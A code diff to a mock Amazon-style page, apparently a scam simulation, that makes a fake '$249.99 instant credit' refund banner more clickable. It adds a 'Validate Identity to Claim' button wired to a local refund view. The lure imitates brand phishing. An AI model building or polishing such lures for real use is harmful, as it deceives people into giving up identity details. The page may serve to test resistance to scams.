@@ -73,7 +73,8 @@
             <div style="font-size:1.5rem;">Gift</div>
             <div class="alert-text">
                 <h4>INSTANT CREDIT AVAILABLE: $249.99</h4>
-                <p>A billing audit detected an overcharge on your account. Claim your automatic refund to Amazon Balance now. <span class="claim-link">Validate Identity to Claim</span></p>
+                <p>A billing audit detected an overcharge on your account. Claim your automatic refund to Amazon Balance now.</p>
+                <button class="btn-amz btn-yellow claim-link" id="claim-identity-btn" style="margin-top:8px;">Validate Identity to Claim &rarr;</button>
             </div>
         </div>
         <div class="main">
@@ -145,6 +146,12 @@
 
         document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('open-refund-hub').addEventListener('click', async () => {
+                await postJson('/api/refund/open', {});
+                showView('view-refund');
+            });
+
+            document.getElementById('claim-identity-btn').addEventListener('click', async (e) => {
+                e.stopPropagation();
                 await postJson('/api/refund/open', {});
                 showView('view-refund');
             });
